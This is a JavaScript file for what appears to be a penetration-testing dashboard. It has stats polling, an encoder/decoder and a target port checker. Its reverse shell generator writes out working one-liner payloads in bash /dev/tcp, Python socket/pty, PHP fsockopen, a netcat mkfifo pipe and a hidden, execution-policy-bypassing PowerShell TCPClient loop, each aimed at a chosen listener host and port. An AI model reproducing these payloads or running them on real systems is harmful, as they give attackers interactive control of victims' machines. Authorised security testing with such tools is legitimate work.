function updateStats() {
    fetch('/api/stats')
        .then(response => response.json())
        .then(data => {
            const cpuText = document.getElementById('cpu-text');
            const cpuBar = document.getElementById('cpu-bar');
            if (cpuText && cpuBar) {
                cpuText.innerText = data.cpu + '%';
                cpuBar.style.width = data.cpu + '%';
            }
            const ramText = document.getElementById('ram-text');
            const ramBar = document.getElementById('ram-bar');
            if (ramText && ramBar) {
                ramText.innerText = data.ram + '%';
                ramBar.style.width = data.ram + '%';
            }
            const diskText = document.getElementById('disk-text');
            const diskBar = document.getElementById('disk-bar');
            if (diskText && diskBar) {
                diskText.innerText = data.disk + '%';
                diskBar.style.width = data.disk + '%';
            }
            const tempText = document.getElementById('temp-text');
            if (tempText) {
                tempText.innerText = data.temp !== "N/A" ? data.temp + '°C' : "N/A";
            }
            const ipText = document.getElementById('ip-text');
            if (ipText) {
                ipText.innerText = data.ip;
            }
        })
        .catch(error => console.error('Error fetching stats:', error));
}

// Reverse Shell Generator Logic
function updateShell() {
    console.log("Updating shell command...");
    const lhostEl = document.getElementById('lhost');
    const lportEl = document.getElementById('lport');
    const typeEl = document.getElementById('shell-type');
    const output = document.getElementById('shell-output');

    if (!output || !lhostEl || !lportEl || !typeEl) return;

    const lhost = lhostEl.value || '127.0.0.1';
    const lport = lportEl.value || '4444';
    const type = typeEl.value;

    let command = '';
    switch(type) {
        case 'bash':
            command = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
            break;
        case 'python':
            command = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
            break;
        case 'php':
            command = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/bash -i <&3 >&3 2>&3");'`;
            break;
        case 'nc':
            command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
            break;
        case 'ps':
            command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            break;
    }
    output.innerText = command;
}

// Encoder/Decoder Logic
function handleCodec(action) {
    console.log("Handling codec:", action);
    const inputEl = document.getElementById('codec-input');
    const outputEl = document.getElementById('codec-output');
    
    if (!inputEl || !outputEl) return;
    const input = inputEl.value;
    
    try {
        if (action === 'b64-enc') outputEl.value = btoa(input);
        else if (action === 'b64-dec') outputEl.value = atob(input);
        else if (action === 'url-enc') outputEl.value = encodeURIComponent(input);
        else if (action === 'url-dec') outputEl.value = decodeURIComponent(input);
    } catch(e) {
        outputEl.value = "Error: " + e.message;
    }
}

// Target Status Logic
function checkStatus() {
    console.log("Checking target status...");
    const targetEl = document.getElementById('target-ip');
    const portEl = document.getElementById('target-port');
    const btn = document.getElementById('check-btn');
    const results = document.getElementById('status-results');

    if (!targetEl || !results || !btn) return;
    const target = targetEl.value;
    const port = portEl.value || 80;

    if (!target) {
        alert("Please enter a target IP or hostname");
        return;
    }

    btn.disabled = true;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';

    fetch('/api/target_check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, port })
    })
    .then(r => r.json())
    .then(data => {
        if (results.innerHTML.includes('No targets checked')) {
            results.innerHTML = '';
        }
        
        const time = new Date().toLocaleTimeString();
        const statusClass = data.open ? 'text-success' : 'text-danger';
        const statusIcon = data.open ? 'fa-check-circle' : 'fa-times-circle';
        
        const item = document.createElement('div');
        item.className = 'list-group-item bg-transparent border-secondary text-light d-flex justify-content-between align-items-center px-0';
        item.innerHTML = `
            <div>
                <span class="fw-bold text-light">${data.target}:${data.port}</span>
                <small class="opacity-50 ms-2 text-muted">${time}</small>
            </div>
            <span class="${statusClass} fw-bold">
                <i class="fas ${statusIcon} me-1"></i>${data.open ? 'OPEN' : 'CLOSED'}
            </span>
        `;
        results.prepend(item);
    })
    .catch(err => {
        console.error("Check status error:", err);
        alert("Error: " + err);
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerText = 'Check';
    });
}

function copyToClipboard(elementId) {
    const el = document.getElementById(elementId);
    if (!el) return;
    const text = el.tagName === 'TEXTAREA' ? el.value : el.innerText;
    navigator.clipboard.writeText(text).then(() => {
        const originalText = el.innerText;
        // Visual feedback
        if (el.tagName !== 'TEXTAREA') {
            const originalColor = el.style.color;
            el.style.color = '#3fb950';
            setTimeout(() => el.style.color = originalColor, 500);
        }
    });
}

// Initial Setup
document.addEventListener('DOMContentLoaded', () => {
    console.log("JS Loaded and DOM Ready");
    
    // Stats interval
    if (document.getElementById('cpu-text')) {
        updateStats();
        setInterval(updateStats, 3000);
    }

    // Shell Gen Listeners
    const shellInputs = ['lhost', 'lport', 'shell-type'];
    shellInputs.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.addEventListener('input', updateShell);
            el.addEventListener('change', updateShell);
        }
    });
    
    // Initialize shell output
    if (document.getElementById('shell-output')) {
        updateShell();
    }
});
